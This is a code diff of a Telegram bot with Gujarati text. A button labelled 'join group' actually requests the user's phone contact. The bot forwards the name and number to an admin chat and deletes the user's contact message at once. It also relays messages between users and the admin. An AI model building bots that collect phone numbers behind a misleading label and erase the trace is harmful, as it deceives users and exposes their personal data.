@@ -2,7 +2,7 @@ import os
 import re
 from flask import Flask
 from threading import Thread
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
     MessageHandler,
@@ -21,19 +21,9 @@ app = Flask(__name__)
 
 # ---------------- START COMMAND ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    button = KeyboardButton(
-        text="join group",
-        request_contact=True
-    )
-    keyboard = ReplyKeyboardMarkup(
-        [[button]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-    await update.message.reply_text(
-        "join group ઉપર ક્લિક કરો ત્યારબાદ લિંક ન મળે તો મેસેજ કરો",
-        reply_markup=keyboard
-    )
+    button = KeyboardButton(text="join group", request_contact=True)
+    keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
+    await update.message.reply_text("join group ઉપર ક્લિક કરો ત્યારબાદ લિંક ન મળે તો મેસેજ કરો", reply_markup=keyboard)
 
 # ---------------- DELETE BUTTON ----------------
 async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -42,7 +32,6 @@ async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data.split("_")
     target_chat_id = int(data[1])
     target_msg_id = int(data[2])
-
     try:
         await context.bot.delete_message(chat_id=target_chat_id, message_id=target_msg_id)
         await query.edit_message_text(text="🗑️ મેસેજ સામેવાળામાંથી ડિલીટ કરી દેવાયો છે.")
@@ -53,48 +42,34 @@ async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat = update.effective_chat
     message = update.message
+    if not message: return
 
-    if not message:
-        return
-
-        # 1. જો યુઝરે કોન્ટેક્ટ શેર કર્યો હોય
+    # 1. જો યુઝરે કોન્ટેક્ટ શેર કર્યો હોય
     if message.contact:
         phone = message.contact.phone_number
-        
-        # એડમિનને નંબર મોકલો
-        await context.bot.send_message(
-            chat_id=YOUR_CHAT_ID,
-            text=f"👤 યુઝર: {message.from_user.first_name}\n📞 નંબર: {phone}"
-        )
-        
-        # આ લાઈન યુઝર દ્વારા મોકલાયેલા કોન્ટેક્ટ મેસેજને તરત જ ડિલીટ કરી દેશે
-        try:
-            await context.bot.delete_message(chat_id=message.chat_id, message_id=message.message_id)
-        except Exception as e:
-            print(f"મેસેજ ડિલીટ કરવામાં ભૂલ: {e}")
-
-        # યુઝરને કન્ફર્મેશન આપો
+        await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=f"👤 યુઝર: {message.from_user.first_name}\n📞 નંબર: {phone}")
+        try: await context.bot.delete_message(chat_id=message.chat_id, message_id=message.message_id)
+        except: pass
         return
-        
 
     # 2. એડમિન રિપ્લાય
     if chat.id == YOUR_CHAT_ID and message.reply_to_message:
         original_msg = message.reply_to_message.text or message.reply_to_message.caption or ""
         target_id = GROUP_ID if "ગ્રુપમાં નવો મેસેજ:" in original_msg else None
         
-        if not target_id:
-            id_match = re.search(r"ID:\s*(\d+)", original_msg)
-            if id_match: target_id = int(id_match.group(1))
+        id_match = re.search(r"ID:\s*(\d+)", original_msg)
+        if id_match: target_id = int(id_match.group(1))
 
         if target_id:
             try:
                 text_content = message.text or message.caption or ""
                 sent_msg = None
                 
+                # અહીં has_spoiler=True ઉમેર્યું છે
                 if message.photo:
-                    sent_msg = await context.bot.send_photo(chat_id=target_id, photo=message.photo[-1].file_id, caption=text_content, protect_content=True)
+                    sent_msg = await context.bot.send_photo(chat_id=target_id, photo=message.photo[-1].file_id, caption=text_content, protect_content=True, has_spoiler=True)
                 elif message.video:
-                    sent_msg = await context.bot.send_video(chat_id=target_id, video=message.video.file_id, caption=text_content, protect_content=True)
+                    sent_msg = await context.bot.send_video(chat_id=target_id, video=message.video.file_id, caption=text_content, protect_content=True, has_spoiler=True)
                 elif message.document:
                     sent_msg = await context.bot.send_document(chat_id=target_id, document=message.document.file_id, caption=text_content, protect_content=True)
                 elif message.text:
@@ -119,8 +94,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         info = f"👤 નામ: {message.from_user.first_name}\n🆔 ID: {message.from_user.id}\n💬 મેસેજ: {message.text or ''}"
         await context.bot.copy_message(chat_id=YOUR_CHAT_ID, from_chat_id=chat.id, message_id=message.message_id, caption=info if not message.text else None)
         if message.text: await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=info)
-
-
 
 # ---------------- FLASK & MAIN ----------------
 @app.route("/")
